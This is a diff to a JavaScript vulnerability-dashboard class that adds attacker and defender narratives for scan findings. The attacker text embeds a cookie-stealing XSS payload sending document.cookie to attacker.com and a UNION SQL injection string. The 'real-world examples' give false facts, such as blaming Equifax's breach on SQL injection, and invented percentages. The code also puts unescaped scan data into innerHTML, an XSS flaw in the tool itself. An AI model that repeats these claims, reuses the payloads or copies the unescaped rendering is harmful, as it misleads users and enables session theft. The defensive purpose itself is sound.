@@ -238,8 +238,19 @@ class DevXploitDashboard {
         // Display AI narratives with red/blue team functionality
         this.displayAINarratives(results.aiAnalysis);
         
-        // Update security score
-        this.updateSecurityScore(results.vulnerabilities?.severity);
+        // Update security score (this is the main fix)
+        if (results.vulnerabilities && results.vulnerabilities.severity) {
+            console.log('📊 Updating security score with:', results.vulnerabilities.severity);
+            this.updateSecurityScore(results.vulnerabilities.severity);
+            
+            // Add event to show score calculation
+            const score = results.vulnerabilities.severity.score;
+            const grade = results.vulnerabilities.severity.grade;
+            const totalVulns = results.vulnerabilities.severity.totalVulnerabilities;
+            
+            this.addRealTimeEvent('calculator', 'text-blue-400', 
+                `Security score calculated: ${score}/100 (${grade}) based on ${totalVulns} findings`);
+        }
         
         // Initialize red/blue team tabs
         this.initializeRedBlueTeamTabs();
@@ -256,6 +267,26 @@ class DevXploitDashboard {
         }
         
         console.log('✅ Results display complete');
+    }
+
+    addRealTimeEvent(icon, color, text) {
+        const eventsFeed = document.getElementById('eventsFeed');
+        if (!eventsFeed) return;
+
+        const item = document.createElement('div');
+        item.className = 'flex items-start gap-3 rounded-lg border border-zinc-800 bg-zinc-950/60 p-3';
+        item.innerHTML = `
+          <span class="inline-flex h-7 w-7 items-center justify-center rounded-md bg-zinc-900 ring-1 ring-zinc-800">
+            <i data-lucide="${icon}" class="h-4 w-4 ${color}" style="stroke-width:1.5"></i>
+          </span>
+          <p class="text-sm text-zinc-300">${text}</p>
+        `;
+        eventsFeed.prepend(item);
+        
+        // Re-initialize icons
+        if (typeof lucide !== 'undefined') {
+            lucide.createIcons({ attrs: { "stroke-width": 1.5 } });
+        }
     }
 
     displayZAPResults(zapScan) {
@@ -367,86 +398,107 @@ class DevXploitDashboard {
             return;
         }
 
-        const vulnHTML = vulnList.map((vuln, index) => {
-            const severityConfig = {
-                'Critical': { 
-                    color: 'text-red-400 bg-red-900/20 border-red-800', 
-                    icon: 'alert-triangle',
-                    bgClass: 'bg-red-500/5 border-red-500/20'
-                },
-                'High': { 
-                    color: 'text-orange-400 bg-orange-900/20 border-orange-800', 
-                    icon: 'zap',
-                    bgClass: 'bg-orange-500/5 border-orange-500/20'
-                }, 
-                'Medium': { 
-                    color: 'text-yellow-400 bg-yellow-900/20 border-yellow-800', 
-                    icon: 'info',
-                    bgClass: 'bg-yellow-500/5 border-yellow-500/20'
-                },
-                'Low': { 
-                    color: 'text-blue-400 bg-blue-900/20 border-blue-800', 
-                    icon: 'eye',
-                    bgClass: 'bg-blue-500/5 border-blue-500/20'
-                },
-                'Info': { 
-                    color: 'text-sky-400 bg-sky-900/20 border-sky-800', 
-                    icon: 'info',
-                    bgClass: 'bg-sky-500/5 border-sky-500/20'
-                }
-            };
+        // Store vulnerabilities for team perspective switching
+        this.currentVulnerabilities = vulnList;
+        this.renderVulnerabilitiesForCurrentTeam();
+    }
 
-            const config = severityConfig[vuln.severity] || severityConfig['Info'];
+    renderVulnerabilitiesForCurrentTeam() {
+        const findingsList = document.getElementById('findingsList');
+        if (!findingsList || !this.currentVulnerabilities) return;
 
-            return `
-                <div class="p-5 hover:bg-zinc-900/30 transition-colors">
-                    <div class="flex items-start gap-4">
-                        <!-- Severity Indicator -->
-                        <div class="flex-shrink-0">
-                            <div class="flex items-center justify-center w-10 h-10 rounded-lg ${config.bgClass} border">
-                                <i data-lucide="${config.icon}" class="w-5 h-5 ${config.color.split(' ')[0]}" style="stroke-width:1.5"></i>
-                            </div>
+        // Determine current team perspective
+        const redTeamTab = document.getElementById('redTeamTab');
+        const isRedTeam = redTeamTab && redTeamTab.className.includes('bg-red-500');
+
+        const vulnHTML = this.currentVulnerabilities.map((vuln, index) => {
+            return this.renderVulnerabilityCard(vuln, index, isRedTeam);
+        }).join('');
+
+        findingsList.innerHTML = vulnHTML;
+        lucide.createIcons();
+    }
+
+    renderVulnerabilityCard(vuln, index, isRedTeam) {
+        const severityConfig = {
+            'Critical': { 
+                color: 'text-red-400 bg-red-900/20 border-red-800', 
+                icon: 'alert-triangle',
+                bgClass: 'bg-red-500/5 border-red-500/20'
+            },
+            'High': { 
+                color: 'text-orange-400 bg-orange-900/20 border-orange-800', 
+                icon: 'zap',
+                bgClass: 'bg-orange-500/5 border-orange-500/20'
+            }, 
+            'Medium': { 
+                color: 'text-yellow-400 bg-yellow-900/20 border-yellow-800', 
+                icon: 'info',
+                bgClass: 'bg-yellow-500/5 border-yellow-500/20'
+            },
+            'Low': { 
+                color: 'text-blue-400 bg-blue-900/20 border-blue-800', 
+                icon: 'eye',
+                bgClass: 'bg-blue-500/5 border-blue-500/20'
+            },
+            'Info': { 
+                color: 'text-sky-400 bg-sky-900/20 border-sky-800', 
+                icon: 'info',
+                bgClass: 'bg-sky-500/5 border-sky-500/20'
+            }
+        };
+
+        const config = severityConfig[vuln.severity] || severityConfig['Info'];
+
+        // Generate team-specific content
+        const perspectiveContent = isRedTeam ? 
+            this.generateRedTeamPerspective(vuln) : 
+            this.generateBlueTeamPerspective(vuln);
+
+        return `
+            <div class="p-5 hover:bg-zinc-900/30 transition-colors border-l-2 ${isRedTeam ? 'border-red-500/30' : 'border-blue-500/30'}">
+                <div class="flex items-start gap-4">
+                    <!-- Severity Indicator -->
+                    <div class="flex-shrink-0">
+                        <div class="flex items-center justify-center w-10 h-10 rounded-lg ${config.bgClass} border">
+                            <i data-lucide="${config.icon}" class="w-5 h-5 ${config.color.split(' ')[0]}" style="stroke-width:1.5"></i>
                         </div>
+                    </div>
 
-                        <!-- Vulnerability Details -->
-                        <div class="flex-1 min-w-0">
-                            <div class="flex items-start justify-between mb-2">
-                                <h3 class="text-base font-semibold text-zinc-200 leading-tight">${vuln.type}</h3>
-                                <span class="inline-flex items-center px-3 py-1 text-xs font-medium rounded-md border ${config.color} ml-3">
+                    <!-- Vulnerability Details -->
+                    <div class="flex-1 min-w-0">
+                        <div class="flex items-start justify-between mb-2">
+                            <h3 class="text-base font-semibold text-zinc-200 leading-tight">${vuln.type}</h3>
+                            <div class="flex items-center gap-2">
+                                <span class="inline-flex items-center px-2 py-1 text-xs font-medium rounded-md border ${config.color}">
                                     ${vuln.severity}
                                 </span>
+                                <span class="inline-flex items-center px-2 py-1 text-xs rounded-md ${isRedTeam ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-blue-500/10 text-blue-400 border border-blue-500/20'}">
+                                    <i data-lucide="${isRedTeam ? 'sword' : 'shield'}" class="w-3 h-3 mr-1" style="stroke-width:1.5"></i>
+                                    ${isRedTeam ? 'Attacker' : 'Defender'}
+                                </span>
                             </div>
-                            
-                            <p class="text-sm text-zinc-400 mb-4 leading-relaxed">${vuln.description}</p>
-                            
-                            <!-- Expandable Details -->
-                            <div class="space-y-3">
-                                <div class="rounded-lg bg-zinc-950/50 border border-zinc-800 p-3">
-                                    <div class="grid md:grid-cols-2 gap-3 text-sm">
-                                        <div>
-                                            <span class="text-zinc-500 font-medium">Location:</span>
-                                            <div class="mt-1 text-zinc-300 font-mono text-xs bg-zinc-900/50 px-2 py-1 rounded border break-all">
-                                                ${vuln.location}
-                                            </div>
-                                        </div>
-                                        <div>
-                                            <span class="text-zinc-500 font-medium">Evidence:</span>
-                                            <div class="mt-1 text-zinc-400 text-xs">
-                                                ${vuln.evidence}
-                                            </div>
+                        </div>
+                        
+                        <p class="text-sm text-zinc-400 mb-4 leading-relaxed">${vuln.description}</p>
+                        
+                        <!-- Team-Specific Perspective -->
+                        ${perspectiveContent}
+                        
+                        <!-- Technical Details -->
+                        <div class="space-y-3 mt-4">
+                            <div class="rounded-lg bg-zinc-950/50 border border-zinc-800 p-3">
+                                <div class="grid md:grid-cols-2 gap-3 text-sm">
+                                    <div>
+                                        <span class="text-zinc-500 font-medium">Location:</span>
+                                        <div class="mt-1 text-zinc-300 font-mono text-xs bg-zinc-900/50 px-2 py-1 rounded border break-all">
+                                            ${vuln.location || vuln.evidence || 'See evidence below'}
                                         </div>
                                     </div>
-                                </div>
-                                
-                                <!-- Remediation -->
-                                <div class="rounded-lg bg-emerald-500/5 border border-emerald-500/20 p-3">
-                                    <div class="flex items-start gap-2">
-                                        <i data-lucide="wrench" class="w-4 h-4 text-emerald-400 flex-shrink-0 mt-0.5" style="stroke-width:1.5"></i>
-                                        <div>
-                                            <span class="text-emerald-400 font-medium text-sm">Remediation:</span>
-                                            <div class="mt-1 text-zinc-300 text-sm leading-relaxed">
-                                                ${vuln.remediation}
-                                            </div>
+                                    <div>
+                                        <span class="text-zinc-500 font-medium">Evidence:</span>
+                                        <div class="mt-1 text-zinc-400 text-xs">
+                                            ${vuln.evidence || 'Vulnerability detected during automated scanning'}
                                         </div>
                                     </div>
                                 </div>
@@ -454,11 +506,266 @@ class DevXploitDashboard {
                         </div>
                     </div>
                 </div>
-            `;
-        }).join('');
+            </div>
+        `;
+    }
 
-        findingsList.innerHTML = vulnHTML;
-        lucide.createIcons();
+    generateRedTeamPerspective(vuln) {
+        // Generate unique attack narratives based on specific vulnerability details
+        let narrative = this.getUniqueAttackerPlan(vuln);
+        
+        return `
+            <div class="rounded-lg bg-red-500/5 border border-red-500/20 p-4">
+                <div class="flex items-start gap-3">
+                    <i data-lucide="sword" class="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" style="stroke-width:1.5"></i>
+                    <div class="flex-1">
+                        <h4 class="text-red-400 font-semibold text-sm mb-2">Red Team Perspective</h4>
+                        <div class="text-zinc-300 text-sm leading-relaxed whitespace-pre-line">${narrative}</div>
+                        <div class="mt-3 p-3 bg-red-900/10 border border-red-800/30 rounded-md">
+                            <p class="text-red-300 text-xs font-medium mb-1">Exploitation Potential:</p>
+                            <p class="text-zinc-400 text-xs">${this.getExploitationPotential(vuln)}</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    getUniqueAttackerPlan(vuln) {
+        const vulnType = vuln.type.toLowerCase();
+        const location = vuln.location || 'the target application';
+        const evidence = vuln.evidence || '';
+        
+        // Generate specific plans based on vulnerability type and context
+        if (vulnType.includes('xss') || vulnType.includes('cross-site scripting')) {
+            return `Attacker Plan for XSS at ${location}:
+
+1. Target Discovery: The attacker notices this XSS vulnerability in the web form or parameter. Like a thief finding an unlocked window, they see an entry point into user sessions.
+
+2. Payload Development: They craft malicious JavaScript code. For example, a simple script that steals cookies: document.location='http://attacker.com/steal.php?cookie='+document.cookie
+
+3. Delivery Method: The attacker tricks users to click a malicious link or submits the payload through the vulnerable form. Similar to how phishing emails work, but through the website itself.
+
+4. Session Hijacking: When a victim views the malicious content, their session cookie gets sent to the attacker. This is like stealing someone's house key while they are visiting.
+
+5. Account Takeover: With the stolen session, the attacker can impersonate the victim, access their account, and perform actions as if they were the legitimate user.
+
+Real-world example: In 2018, British Airways suffered an XSS attack where attackers injected malicious code that skimmed credit card details from 380,000 customers during checkout.`;
+        }
+        
+        if (vulnType.includes('sql injection')) {
+            return `Attacker Plan for SQL Injection at ${location}:
+
+1. Database Probing: The attacker tests input fields with special characters like single quotes to see if they get database errors. Think of it like trying different keys to see which one opens a lock.
+
+2. Information Gathering: They use SQL commands to discover database structure, table names, and column details. Similar to a burglar studying a building's layout before breaking in.
+
+3. Data Extraction: The attacker crafts SQL queries to dump sensitive data like usernames, passwords, and personal information. For example: ' UNION SELECT username,password FROM users--
+
+4. Privilege Escalation: They attempt to gain administrative database access using functions like xp_cmdshell in SQL Server or load_file in MySQL.
+
+5. System Compromise: With database admin rights, they can read files, write backdoors, or even execute system commands on the server.
+
+Real-world example: The 2017 Equifax breach exposed 147 million people's data through SQL injection, including Social Security numbers and credit card information.`;
+        }
+        
+        if (vulnType.includes('missing') && vulnType.includes('header')) {
+            const headerName = evidence.match(/Header '([^']+)'/)?.[1] || 'security header';
+            return `Attacker Plan for Missing ${headerName} at ${location}:
+
+1. Header Analysis: The attacker uses tools like curl or browser developer tools to check what security headers are missing. Like checking if a house has security cameras or alarm systems.
+
+2. Attack Vector Selection: Based on the missing header, they choose the right attack. No X-Frame-Options means clickjacking is possible, no CSP means XSS attacks are easier.
+
+3. Malicious Site Creation: They create a fake website that exploits the missing protection. For example, embedding the target site in an invisible iframe for clickjacking.
+
+4. Social Engineering: The attacker tricks users into visiting their malicious site through phishing emails or fake advertisements.
+
+5. Exploitation: When users interact with the malicious site, the missing security headers allow the attack to succeed, potentially stealing data or performing unauthorized actions.
+
+Real-world example: Many banking websites have been targeted by clickjacking attacks where missing X-Frame-Options headers allowed attackers to overlay invisible buttons over legitimate banking functions.`;
+        }
+        
+        if (vulnType.includes('form') && vulnType.includes('security')) {
+            return `Attacker Plan for Form Security Issues at ${location}:
+
+1. Form Analysis: The attacker examines all forms on the website to understand how data is processed. Like a con artist studying their mark's routines and weaknesses.
+
+2. CSRF Token Bypass: If forms lack CSRF protection, they create malicious websites that automatically submit forms when victims visit. The victim's browser unwittingly sends authenticated requests.
+
+3. Input Validation Testing: They test various malicious inputs to see what gets through. Think of it like testing different fake IDs to see which one works.
+
+4. Session Management Exploitation: If forms use GET methods for sensitive data, the attacker can steal information from browser history, referrer headers, or server logs.
+
+5. Business Logic Abuse: They manipulate form submissions to bypass intended workflows, like changing prices in shopping carts or accessing unauthorized features.
+
+Real-world example: Many e-commerce sites have been exploited through form manipulation, allowing attackers to purchase expensive items for pennies by modifying hidden price fields.`;
+        }
+        
+        // Default plan for other vulnerability types
+        return `Attacker Plan for ${vuln.type} at ${location}:
+
+1. Vulnerability Assessment: The attacker identifies this specific security weakness and studies how it can be exploited. Like a thief examining a weak lock or broken window.
+
+2. Tool Preparation: They gather appropriate exploitation tools and techniques specific to this vulnerability type. Each vulnerability requires different methods and approaches.
+
+3. Attack Execution: The attacker systematically exploits the vulnerability using proven techniques. They often start with simple tests and gradually increase complexity.
+
+4. Impact Assessment: They determine what data or systems can be accessed through this vulnerability. The goal is to understand the full scope of potential damage.
+
+5. Persistence and Expansion: If successful, they try to maintain access and use this vulnerability as a stepping stone to find additional weaknesses in the system.
+
+This type of vulnerability commonly leads to unauthorized access, data theft, or system compromise depending on the specific implementation and context.`;
+    }
+
+    generateBlueTeamPerspective(vuln) {
+        // Generate unique defense strategies based on specific vulnerability details
+        let strategy = this.getUniqueDefenderPlan(vuln);
+
+        return `
+            <div class="rounded-lg bg-blue-500/5 border border-blue-500/20 p-4">
+                <div class="flex items-start gap-3">
+                    <i data-lucide="shield" class="w-5 h-5 text-blue-400 flex-shrink-0 mt-0.5" style="stroke-width:1.5"></i>
+                    <div class="flex-1">
+                        <h4 class="text-blue-400 font-semibold text-sm mb-2">Blue Team Perspective</h4>
+                        <div class="text-zinc-300 text-sm leading-relaxed whitespace-pre-line">${strategy}</div>
+                        <div class="mt-3 p-3 bg-emerald-900/10 border border-emerald-800/30 rounded-md">
+                            <p class="text-emerald-300 text-xs font-medium mb-1">Remediation Steps:</p>
+                            <p class="text-zinc-400 text-xs">${vuln.remediation || vuln.recommendation || 'Follow security best practices for this vulnerability type'}</p>
+                        </div>
+                        ${this.generateCodeExample(vuln)}
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    getUniqueDefenderPlan(vuln) {
+        const vulnType = vuln.type.toLowerCase();
+        const location = vuln.location || 'the affected component';
+        const evidence = vuln.evidence || '';
+        
+        // Generate specific defense strategies based on vulnerability type and context
+        if (vulnType.includes('xss') || vulnType.includes('cross-site scripting')) {
+            return `Developer Defense Plan for XSS at ${location}:
+
+1. Input Validation: Set up strict input validation that only allows expected characters. Think of it like having a bouncer at a club who checks IDs and only lets in approved guests.
+
+2. Output Encoding: Always encode user data before displaying it in HTML. This is like putting dangerous chemicals in safe containers before handling them.
+
+3. Content Security Policy: Implement CSP headers that block inline scripts and only allow scripts from trusted sources. Similar to having a whitelist of approved visitors for a secure building.
+
+4. Framework Protection: Use modern web frameworks like React or Angular that automatically escape user input. This is like using a car with built-in safety features instead of building your own.
+
+5. Regular Testing: Set up automated security tests in your development pipeline. Just like having regular fire drills, you want to catch problems before they become emergencies.
+
+Real-world example: After the 2018 British Airways attack, they implemented strict CSP headers and input validation that now blocks similar XSS attempts automatically.`;
+        }
+        
+        if (vulnType.includes('sql injection')) {
+            return `Developer Defense Plan for SQL Injection at ${location}:
+
+1. Prepared Statements: Replace all dynamic SQL queries with parameterized queries. This separates code from data, like having separate lanes for cars and pedestrians.
+
+2. Input Validation: Validate and sanitize all user inputs before they reach the database. Think of it as having a security checkpoint that inspects everything coming in.
+
+3. Database Permissions: Use database accounts with minimal required permissions. Like giving employees access cards that only work for areas they need to access.
+
+4. Error Handling: Replace detailed database error messages with generic ones. Instead of telling attackers exactly what went wrong, show them a simple error page.
+
+5. Web Application Firewall: Deploy a WAF to filter malicious requests before they reach your application. This acts like a security guard who checks visitors before they enter the building.
+
+Real-world example: After the Equifax breach, many companies implemented mandatory code reviews and automated SQL injection testing that catches 99% of these vulnerabilities before deployment.`;
+        }
+        
+        if (vulnType.includes('missing') && vulnType.includes('header')) {
+            const headerName = evidence.match(/Header '([^']+)'/)?.[1] || 'security header';
+            return `Developer Defense Plan for Missing ${headerName} at ${location}:
+
+1. Header Implementation: Add the missing security header to your web server or application configuration. This is like installing a missing security feature on your building.
+
+2. Configuration Review: Check all your web servers and load balancers to ensure consistent security header deployment. Make sure every entry point has the same protection.
+
+3. Testing and Monitoring: Use tools like securityheaders.com to regularly test your headers. Set up monitoring alerts if headers are accidentally removed during deployments.
+
+4. Content Security Policy: If missing CSP, start with a report-only policy to understand your application's requirements, then gradually tighten restrictions.
+
+5. HTTPS Enforcement: If missing HSTS, implement HTTP Strict Transport Security to force all connections over secure HTTPS. This prevents downgrade attacks.
+
+Real-world example: Major banks now use comprehensive security headers that have reduced clickjacking attacks by over 95% since implementation.`;
+        }
+        
+        if (vulnType.includes('form') && vulnType.includes('security')) {
+            return `Developer Defense Plan for Form Security Issues at ${location}:
+
+1. CSRF Protection: Implement anti-CSRF tokens for all state-changing operations. Each form gets a unique token that must be validated on submission, like requiring a secret handshake.
+
+2. Server-Side Validation: Never trust client-side validation alone. Always re-validate everything on the server, like double-checking documents even if they were pre-approved.
+
+3. HTTPS Only: Ensure all forms submit over HTTPS, especially those handling sensitive data. This encrypts the data in transit like sending documents in a locked briefcase.
+
+4. Rate Limiting: Implement submission limits to prevent automated abuse. Like having a "one transaction per minute" rule to stop bulk fraudulent activity.
+
+5. Input Sanitization: Clean and validate all form inputs on the server side. Remove or escape any potentially dangerous characters before processing.
+
+Real-world example: E-commerce sites that implemented CSRF tokens and server-side validation saw a 90% reduction in fraudulent transactions and form manipulation attacks.`;
+        }
+        
+        // Default plan for other vulnerability types
+        return `Developer Defense Plan for ${vuln.type} at ${location}:
+
+1. Immediate Assessment: Evaluate the scope and impact of this vulnerability in your codebase. Check if similar issues exist in other parts of your application.
+
+2. Priority Patching: Address this vulnerability based on its severity level. Critical and high-severity issues should be fixed within days, not weeks.
+
+3. Code Review: Conduct thorough reviews of similar code patterns throughout your application. Often vulnerabilities appear in multiple places.
+
+4. Security Testing: Implement automated security testing in your development pipeline to catch similar issues early. Prevention is always better than reactive fixes.
+
+5. Team Training: Ensure your development team understands this vulnerability type and how to prevent it in future code. Knowledge sharing prevents recurring issues.
+
+This type of vulnerability requires careful attention to secure coding practices and regular security assessments to prevent recurrence.`;
+    }
+
+    getExploitationPotential(vuln) {
+        const potentials = {
+            'Critical': 'Immediate system compromise possible. Attackers can gain unauthorized access to sensitive data or execute arbitrary code.',
+            'High': 'Significant security risk. Can lead to data breaches, account takeovers, or system manipulation.',
+            'Medium': 'Moderate risk with potential for information disclosure or limited system access.',
+            'Low': 'Lower impact but can be chained with other vulnerabilities for greater effect.',
+            'Info': 'Information gathering potential that aids in planning more sophisticated attacks.'
+        };
+        return potentials[vuln.severity] || potentials['Medium'];
+    }
+
+    generateCodeExample(vuln) {
+        const codeExamples = {
+            'XSS': `<pre class="mt-3 text-xs bg-zinc-950/50 border border-zinc-800 rounded p-2 text-zinc-300 overflow-x-auto"><code>// Secure Implementation Example
+// BEFORE (Vulnerable)
+response.write("&lt;div&gt;" + userInput + "&lt;/div&gt;");
+
+// AFTER (Secure)
+response.write("&lt;div&gt;" + escapeHtml(userInput) + "&lt;/div&gt;");</code></pre>`,
+            'SQL Injection': `<pre class="mt-3 text-xs bg-zinc-950/50 border border-zinc-800 rounded p-2 text-zinc-300 overflow-x-auto"><code>// Secure Implementation Example
+// BEFORE (Vulnerable)
+"SELECT * FROM users WHERE id = " + userId
+
+// AFTER (Secure - Prepared Statement)
+"SELECT * FROM users WHERE id = ?"
+with parameter: userId</code></pre>`,
+            'Missing Security Header': `<pre class="mt-3 text-xs bg-zinc-950/50 border border-zinc-800 rounded p-2 text-zinc-300 overflow-x-auto"><code>// Security Headers Configuration
+Content-Security-Policy: default-src 'self'; script-src 'self'
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre>`
+        };
+
+        for (const [vulnType, code] of Object.entries(codeExamples)) {
+            if (vuln.type.toLowerCase().includes(vulnType.toLowerCase())) {
+                return code;
+            }
+        }
+        return '';
     }
 
     displayAINarratives(aiAnalysis) {
@@ -513,6 +820,9 @@ class DevXploitDashboard {
         // Update content visibility
         if (redTeamContent) redTeamContent.style.display = 'block';
         if (blueTeamContent) blueTeamContent.style.display = 'none';
+
+        // Re-render vulnerabilities with red team perspective
+        this.renderVulnerabilitiesForCurrentTeam();
     }
 
     switchToBlueTeam() {
@@ -532,6 +842,9 @@ class DevXploitDashboard {
         // Update content visibility
         if (redTeamContent) redTeamContent.style.display = 'none';
         if (blueTeamContent) blueTeamContent.style.display = 'block';
+
+        // Re-render vulnerabilities with blue team perspective
+        this.renderVulnerabilitiesForCurrentTeam();
     }
 
     formatNarrative(text) {
@@ -548,24 +861,24 @@ class DevXploitDashboard {
     updateSecurityScore(severity) {
         if (!severity) return;
 
-        const scoreElement = document.getElementById('securityScore');
-        const scoreBar = document.getElementById('securityScoreBar');
+        // Update the main score display
+        const scoreLabel = document.getElementById('scoreLabel');
+        const scoreState = document.getElementById('scoreState');
         
-        if (scoreElement) {
-            scoreElement.textContent = severity.score;
+        if (scoreLabel) {
+            scoreLabel.textContent = severity.score || 100;
         }
         
-        if (scoreBar) {
-            scoreBar.style.width = `${severity.score}%`;
-            
-            // Color based on score
-            if (severity.score >= 80) {
-                scoreBar.className = scoreBar.className.replace(/bg-\w+-\d+/, 'bg-emerald-500');
-            } else if (severity.score >= 60) {
-                scoreBar.className = scoreBar.className.replace(/bg-\w+-\d+/, 'bg-yellow-500');
-            } else {
-                scoreBar.className = scoreBar.className.replace(/bg-\w+-\d+/, 'bg-red-500');
-            }
+        if (scoreState) {
+            scoreState.textContent = severity.grade || 'Excellent';
+        }
+
+        // Update the doughnut chart
+        const scoreChart = window.scoreChart;
+        if (scoreChart) {
+            const score = severity.score || 100;
+            scoreChart.data.datasets[0].data = [score, 100 - score];
+            scoreChart.update();
         }
 
         // Update vulnerability counts in the sidebar
@@ -583,6 +896,26 @@ class DevXploitDashboard {
                 element.textContent = count;
             }
         });
+
+        // Update the overall stats display
+        this.updateOverallStats(severity);
+    }
+
+    updateOverallStats(severity) {
+        // Update the scan mode badge based on vulnerability count
+        const modeBadge = document.getElementById('modeBadge');
+        if (modeBadge && severity.totalVulnerabilities > 0) {
+            const riskLevel = severity.score >= 75 ? 'Low Risk' : 
+                            severity.score >= 50 ? 'Medium Risk' : 'High Risk';
+            
+            const riskColor = severity.score >= 75 ? 'text-emerald-400' : 
+                            severity.score >= 50 ? 'text-amber-400' : 'text-red-400';
+            
+            modeBadge.innerHTML = `
+                <span class="h-1.5 w-1.5 rounded-full ${severity.score >= 75 ? 'bg-emerald-500' : severity.score >= 50 ? 'bg-amber-500' : 'bg-red-500'}"></span>
+                <span class="${riskColor}">${riskLevel}</span>
+            `;
+        }
     }
 
     initializeKillChainInteraction() {
